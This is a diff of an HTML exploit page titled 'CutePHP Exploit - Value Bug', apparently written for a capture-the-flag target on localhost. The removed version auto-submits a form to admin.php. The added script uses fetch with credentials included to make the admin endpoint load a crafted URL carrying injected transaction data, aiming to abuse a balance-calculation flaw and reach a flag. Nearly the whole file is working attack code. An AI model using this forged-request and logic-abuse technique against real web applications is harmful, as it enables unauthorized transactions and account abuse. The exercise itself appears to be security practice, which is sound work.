@@ -1,20 +1,27 @@
 <!DOCTYPE html>
 <html>
-<head><title>Test</title></head>
+<head><title>CutePHP Exploit - Value Bug</title></head>
 <body>
-    <h1 style="color:red;font-size:50px;">REDIRECT WORKED!</h1>
-    <p>Current URL: <script>document.write(window.location.href);</script></p>
-    <p>User Agent: <script>document.write(navigator.userAgent);</script></p>
-    <p>Time: <script>document.write(new Date().toISOString());</script></p>
-    
-    <h2>Now attempting exploit...</h2>
-    <form method="post" action="http://localhost:5000/admin.php" name="f">
-        <input name="url" value="http://localhost:5000/admin.php?transactions[0][amount]=1&transactions[0][country]=FLAG">
-    </form>
-    
+    <h1>Trying value bug exploit...</h1>
     <script>
-        document.write('<p style="color:blue;">JavaScript working! Submitting form now...</p>');
-        document.f.submit();
+        // Try exploiting the "$balance += $value ? $value : $amount;" logic
+        // If we can make $value = 0, we get $amount added directly
+        fetch('http://localhost:5000/admin.php', {
+            method: 'POST',
+            body: new URLSearchParams({
+                url: 'http://localhost:5000/index.php?html=' + encodeURIComponent(
+                    '- amount: 999999\n' +
+                    '  currency: US\n' +
+                    '  op: SELL\n' +
+                    '- amount: 1\n' +
+                    '  currency: FL\n' +
+                    '  op: BUY'
+                )
+            }),
+            credentials: 'include'
+        }).then(r => r.text()).then(result => {
+            document.body.innerHTML = '<pre>' + result + '</pre>';
+        });
     </script>
 </body>
 </html>
